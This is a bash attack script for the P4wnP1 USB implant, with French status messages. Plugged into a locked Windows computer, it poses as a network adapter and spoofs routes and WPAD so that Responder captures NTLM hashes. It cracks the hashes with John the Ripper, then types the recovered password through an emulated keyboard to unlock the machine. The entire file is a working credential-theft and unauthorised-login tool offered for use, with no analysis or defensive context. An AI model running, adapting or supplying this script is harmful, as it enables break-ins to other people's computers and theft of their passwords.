#!/bin/bash

USB_VID="0x1d6b"        # Vendor ID
USB_PID=$(printf "0x%04X" $RANDOM)        # Random PID to raise chance of driver reinstall
USE_ECM=false            # we need no Linux/Mac networking
USE_RNDIS=true          # RNDIS network device to enable hash stealing
USE_HID=true            # HID keyboard to allow entering cracked password
USE_UMS=false           # no mass storage
lang="fr" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
IF_IP="172.16.0.1" # IP used by P4wnP1
IF_MASK="255.255.255.252" 
IF_DHCP_RANGE="172.16.0.2,172.16.0.2" # DHCP Server IP Range
ROUTE_SPOOF=true # set two static routes on target to cover whole IPv4 range, raise chance of capturing packets with hashes
WPAD_ENTRY=true # provide a WPAD entry via DHCP pointing to responder
wdir=/usr/local/P4wnP1/scripts
rm $wdir/Responder/Responder.db
active_interface=usbeth
# define some helper functions and custom vars
CRACK=true # enable cracking of dumped hashes on P4wnP1
LOGIN=true # enable Login attempt if hash is cracked

P4wnP1_cli hid run -c 'press("CAPS");delay(100);press("CAPS");delay(100);press("CAPS");delay(100);press("CAPS");delay(100);press("CAPS");delay(100);press("CAPS");delay(100);' >/dev/null
echo "Fermeture SMB"
/etc/init.d/smbd stop


function responder_db_contains_data()
{
	responder_db="$wdir/Responder/Responder.db"

	if [ -f $responder_db ]; then
		if [ $(wc -c < $responder_db) -gt "0" ]; then
			echo "Responder.db est vide"
			return 0
			
		else
			echo "Responder.db n'est plus vide"
			return 1			
		fi
	else
		echo "Pas de fichier Responder.db"
		return 1	
	fi
}

function check_for_hash()
{
	# exclude hashes for "SMB\"
	if [[ $(sqlite3 $wdir/Responder/Responder.db "select fullhash from responder where not user='SMB\'") ]]; then
		echo "Vérification du HASH"
		return 0

	else
		echo "Pas de HASH"
		return 1
	fi
}

function get_hash()
{
	echo "Obtention du HASH"
	# exclude hashes for "SMB\"
	sqlite3 -line $wdir/Responder/Responder.db "select fullhash from responder where not user='SMB\'" | cut -d " " -f3
}

function kill_responder()
{
	echo "Arrêt du RESPONDER"
	P4wnP1_cli hid run -c 'press("CAPS");delay(300);press("CAPS");delay(300);press("CAPS");delay(300);press("CAPS");delay(300);press("CAPS");delay(300);press("CAPS");delay(300);' >/dev/null
	sudo kill $(ps -aux | grep "Responder.py" | grep -v -e "bash" | grep -v -e "grep" | awk '{print $2}')
	echo "Responder terminé, réouveture SMB"
	/etc/init.d/smbd start
}

function extract_password()
{
	# assumes there's only one password which has been cracked 
	john --pot=/tmp/john.pot --show $1 | grep ":" | cut -d":" -f2
}

# This function gets called after the target network interface is working
# (RNDIS, CDC ECM or both have to be enabled)
function onNetworkUp()
{
	
	# redirect unicast traffic for every destination to responder (cacth packets sent to our huge subnet ;-) )
	# update-alternatives --set iptables /usr/sbin/iptables-legacy
	# To revert if that was notthe issue then you need to run:
	# update-alternatives --set iptables /usr/sbin/iptables-nft
	echo "Redirection du traffic vers le RESPONDER"

    iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
    iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT

	echo "Démarrage du RESPONDER ..."

	# delete Responder.db
	rm $wdir/Responder/Responder.db

	# start responder in screen session
    screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -d -r -w -P"
	echo "Création du DOSSIER temporaire tmp RESPONDER"
	touch /tmp/responder_started

	echo "RESPONDER Démarré"
	
}

# this function gets called if the target received a DHCP lease
# (DHCP client has to be running on target)
function onTargetGotIP()
{
	echo "Attente des HASHES... "

	# wait till hashes have been grabbed (exluding hashes for host\user "SMB\"
	until responder_db_contains_data && check_for_hash; do
		sleep 0.5 # 500 ms delay before recheck
	done
	

	# at this point we should have one or more hashes, so we save them and kill responder
	
	
	fname="$target_name""_""$target_ip"
	# count existing folders of this name
	fcount=$(ls -la $wdir/Responder/logs/ | grep "$fname" | wc -l)
	fname="$fname""_""$fcount"".hashes"

	hashfile=$wdir/Responder/logs/$fname
	
	get_hash > $hashfile
	# chown -R pi:pi $wdir/Responder/logs/
	sync
	echo "Le HASH suivant a été capturé:"
	cat $hashfile
	kill_responder

	
	if $CRACK; then
		echo "Démarrage de Jack the Reaper pour craquer le PASSWORD..."
		# use temporary pot file (known hashes will be cracked again)
		john --pot=/tmp/john.pot $hashfile
		echo "HASH Craqué !!!"
		sync

				
		# store a backup of cracked hash
		john --show --pot=/tmp/john.pot $hashfile | tee $hashfile.cracked

		
	fi

	# from here we could start entering the passwords one by one (depending on target OS is needed on too many failed attempts)
	
	if $LOGIN; then
		# we assume theres only one password
		extract_password $hashfile > /tmp/login
		sync
	fi
	
	
}

function onKeyboardUp()
{
	if $LOGIN; then
		# wait till a file with login password is created
		until [ -f /tmp/login ]; do 
                        echo "Attente de création du fichier LOGIN PASSWORD"
			sleep 1
			echo .
		done
		
		
		# writing to the file hasn't finished in every case, when we get here, thus we wait for content (this won't work with empty passwords)
		until [ $(wc -c < /tmp/login) -gt "0" ]; do sleep 1; echo .; done
		sync
		
		# to avoid get the password screen input ready we press CTRL+ALT+DEL, multiple times (to allow wake up)
		for i in $(seq 3); do
			echo "Envoi de CTRL-ALT + DEL"
			P4wnP1_cli hid run -c 'press("CTRL ALT DELETE");delay(500);' >/dev/null
			sleep 0.5
			
		done
			
		pass=$(cat /tmp/login)
		echo "Saisie du mot de passe sur le clavier"
		
		# We target Win 10, which needs a keypress to bring the password prompt up (we're pressing a)
		# addtiotionally, we assume that the keyboard is up and running at this point
		
		

		# Create HID script 

		# P4wnP1_cli hid run -c 'layout("fr");press("ESC");delay(1000);type("${pass}");delay(1000);' >/dev/null
		# press("ENTER");
		echo "layout(\"fr\")" > /usr/local/P4wnP1/HIDScripts/smbrute.js
		echo "press(\"ESC\")" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
		echo "delay(1000)" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
		echo "type(\"${pass}\")" >> /usr/local/P4wnP1/HIDScripts/smbrute.js
		echo "delay(1000)" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
		echo "press(\"ENTER\")" >>/usr/local/P4wnP1/HIDScripts/smbrute.js		
		
		# Run HID scrtit (try to login with found password)
		P4wnP1_cli hid run -n smbrute.js >/dev/null

		# Delete HID script
		rm /usr/local/P4wnP1/HIDScripts/smbrute.js
		echo "Saisie terminée"

	fi
}

onNetworkUp 
onTargetGotIP
onKeyboardUp


P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
